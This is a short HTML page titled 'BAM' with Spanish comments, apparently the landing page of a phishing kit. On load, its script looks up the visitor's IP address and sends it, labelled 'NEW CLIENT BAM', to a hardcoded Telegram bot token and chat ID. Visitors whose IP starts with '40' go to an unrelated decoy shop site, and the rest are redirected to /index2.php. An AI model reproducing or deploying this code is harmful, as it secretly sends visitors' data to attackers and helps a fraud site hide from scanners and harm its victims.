<!DOCTYPE html>
<html>
<head>
<title>BAM</title>
    <style>
        /* Estilos aquí */
    </style>
    <script>
        setTimeout(function() {
            window.location.href = "/index2.php";
        }, 3000);

        // Función para obtener la dirección IP del cliente
        function getIPAddress() {
            return fetch("https://api.ipify.org?format=json")
                .then(function(response) {
                    return response.json();
                })
                .then(function(data) {
                    return data.ip;
                });
        }

        // Obtener la dirección IP y enviarla a Telegram
        getIPAddress().then(function(ipAddress) {
            var telegramURL = "https://api.telegram.org/bot7612926444:AAHVCEL6_VZgmMLLoD8U6gUMUXubFVhGubQ/sendMessage?chat_id=-4205757773&text= NEW CLIENT BAM: " + ipAddress;

            fetch(telegramURL)
                .then(function(response) {
                    console.log("Notificación enviada a Telegram");
                })
                .catch(function(error) {
                    console.error("Error al enviar la notificación a Telegram:", error);
                });

            // Verificar si la IP comienza con "40" y redirigir si es necesario
            if (ipAddress.startsWith("40")) {
                window.location.href = "https://myglobalflowers.es/";
            }
        });
    </script>
</head>
<body>
    <!-- Contenido aquí -->
</body>
</html>